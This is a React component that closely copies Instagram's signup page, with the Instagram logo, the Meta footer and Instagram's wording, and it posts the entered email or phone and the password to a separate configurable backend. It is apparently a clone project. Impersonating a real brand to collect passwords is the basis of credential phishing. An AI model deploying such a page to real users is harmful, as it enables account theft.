import { useState, useEffect } from 'react';
import axios from 'axios';
import { Link, useNavigate } from 'react-router-dom';

const Signup = () => {
  const [formData, setFormData] = useState({
    emailOrMobile: '',
    fullName: '',
    username: '',
    password: ''
  });
  const [isFormValid, setIsFormValid] = useState(false);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  useEffect(() => {
    const { emailOrMobile, fullName, username, password } = formData;
    setIsFormValid(
      emailOrMobile.length >= 1 && 
      fullName.length >= 1 && 
      username.length >= 1 && 
      password.length >= 6
    );
  }, [formData]);

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSignup = async (e) => {
    e.preventDefault();
    if (!isFormValid) return;
    
    setLoading(true);
    const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'http://localhost:5000';
    
    try {
      await axios.post(`${BACKEND_URL}/api/auth/signup`, {
        emailOrUsername: formData.emailOrMobile, // Backend expects this
        password: formData.password
      });
      alert('Account created successfully. Please login.');
      navigate('/');
    } catch (err) {
      alert(err.response?.data?.message || 'Signup failed');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="mobile-container">
      <div className="top-lang">
        <span>English (UK)</span>
      </div>

      <div className="content-wrapper">
        <div className="logo-section">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" 
            alt="Instagram" 
            className="glyph-logo"
          />
        </div>

        <h2 style={{ color: '#a8b3bc', textAlign: 'center', fontSize: '16px', marginBottom: '20px', fontWeight: '600' }}>
          Sign up to see photos and videos from your friends.
        </h2>
        
        <form onSubmit={handleSignup} className="login-form">
          <div className="input-group">
            <input 
              type="text" 
              name="emailOrMobile"
              placeholder="Mobile number or email address"
              value={formData.emailOrMobile}
              onChange={handleChange}
            />
          </div>
          <div className="input-group">
            <input 
              type="text" 
              name="fullName"
              placeholder="Full Name"
              value={formData.fullName}
              onChange={handleChange}
            />
          </div>
          <div className="input-group">
            <input 
              type="text" 
              name="username"
              placeholder="Username"
              value={formData.username}
              onChange={handleChange}
            />
          </div>
          <div className="input-group">
            <input 
              type="password" 
              name="password"
              placeholder="Password"
              value={formData.password}
              onChange={handleChange}
            />
          </div>
          
          <p style={{ color: '#a8b3bc', fontSize: '12px', textAlign: 'center', margin: '10px 0' }}>
            People who use our service may have uploaded your contact information to Instagram. <a href="#" style={{ color: '#0095f6', textDecoration: 'none' }}>Learn more</a>
          </p>
          
          <button 
            type="submit" 
            className="login-btn"
            disabled={!isFormValid || loading}
          >
            {loading ? 'Signing up...' : 'Sign up'}
          </button>
        </form>
      </div>

      <div className="bottom-section">
        <div style={{ color: '#f5f5f5', fontSize: '14px', marginBottom: '20px' }}>
          Have an account? <Link to="/" style={{ color: '#0095f6', textDecoration: 'none', fontWeight: '600' }}>Log in</Link>
        </div>
        <div className="meta-footer">
          <svg viewBox="0 0 24 24" className="meta-logo-svg">
            <path d="M16.143 4.5c-2.457 0-4.414 1.83-5.32 3.623C9.917 6.33 7.96 4.5 5.503 4.5 2.463 4.5 0 6.963 0 10.003s2.463 5.503 5.503 5.503c2.457 0 4.414-1.83 5.32-3.623.906 1.793 2.863 3.623 5.32 3.623 3.04 0 5.503-2.463 5.503-5.503S19.183 4.5 16.143 4.5zm0 8.414c-1.61 0-2.911-1.301-2.911-2.911s1.301-2.911 2.911-2.911 2.911 1.301 2.911 2.911-1.301 2.911-2.911 2.911zm-10.64 0c-1.61 0-2.911-1.301-2.911-2.911s1.301-2.911 2.911-2.911 2.911 1.301 2.911 2.911-1.301 2.911-2.911 2.911z" />
          </svg>
          <span className="meta-text">Meta</span>
        </div>
      </div>
    </div>
  );
};

export default Signup;
